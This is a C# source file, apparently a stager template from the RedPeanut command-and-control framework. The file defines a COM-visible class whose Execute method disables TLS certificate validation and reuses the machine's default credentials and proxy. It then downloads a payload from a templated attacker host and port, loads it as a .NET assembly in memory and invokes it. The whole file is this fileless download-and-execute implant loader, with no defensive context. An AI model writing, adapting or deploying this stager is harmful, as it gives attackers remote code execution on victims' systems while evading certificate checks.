using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;
using System.Net.NetworkInformation;
using System.Text.RegularExpressions;

[ComVisible(true)]
public class RedPeanutShooter
{
    
    public RedPeanutShooter()
    {
        
          //Execute();
          
    }

    public void Execute()
    {
        string host = "#HOST#";
        int port = 0;
        Int32.TryParse("#PORT#", out port);
        string resourceurl = "#RESURLCEURL#";

        Thread.Sleep(5000);
        try
        {
            WebClient wc = new WebClient();
            wc.UseDefaultCredentials = true;
            wc.Proxy = WebRequest.DefaultWebProxy;
            wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.DefaultConnectionLimit = 9999;
            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });

            string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, resourceurl);
            byte[] resp = wc.DownloadData(rpaddress);
            
            System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(resp);
            assembly.GetTypes()[0].GetMethods()[0].Invoke(null, null);
        }
        catch (WebException e)
        {
            Console.WriteLine(e.Message);
            Console.WriteLine(e.Status);
        }

    }
}

